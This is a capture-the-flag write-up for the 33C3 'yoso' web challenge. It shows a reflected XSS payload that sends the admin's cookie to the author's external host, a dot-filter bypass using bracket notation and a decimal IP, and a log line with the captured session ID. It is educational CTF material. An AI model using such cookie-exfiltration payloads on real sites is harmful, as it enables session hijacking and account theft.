#yoso(web, 250, 38 solves)
> You only live once, so why search twice?

> (admins love to search for flags btw)

![scr1](scr1.png)

We are able to send a link to admin, which he then visits. Our goal is to download admin's bookmarks.

After some investigation, we found a reflected xss at `http://78.46.224.80:1337/download.php?zip=<script>alert("hello world")</script>`

So all we have to do now is either steal the admins'c cookie or get the zip with a ajax/xmlhttp request and then send a request to `ourdomain.com/+data`. We'll go with the first option, as it's a lot easier. 

Payload:

``` javascript

<script> window.location = "http://nazywam.host/itWorks!"+document.cookie </script>

```

Unfortunately, the zip parameter is filtered, all dots are removed. So we have to find a way to bypass it.


 * `nazywam.host` can be easily changed into a decimal ip, `1558071511`
 * `window.location` and `document.cookie` can be written as `window["location"]` and `document["cookie"]`
 * `string + string` -> `string["concat"](string)`

Final payload:

``` javascript

<script>window["location"] = "http://1558071511/itWorks!"["concat"](document["cookie"]) </script>

````

This allows us to get the cookie 

```
78.46.224.80 - - [29/Dec/2016:11:46:48 +0100] "GET /itWorks!PHPSESSID=ol8gur9chbfq0g0ufnm6h8vrc1 HTTP/1.1" 404 143 "http://78.46.224.80:1337/download.php?zip=%3Cscript%3Ewindow[%22location%22]%20=%20%22http://1558071511/itWorks!%22[%22concat%22](document[%22cookie%22])%20%3C/script%3E" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

And finally, the flag: `33C3_lol_wHo_needs_scr1pts_anyway`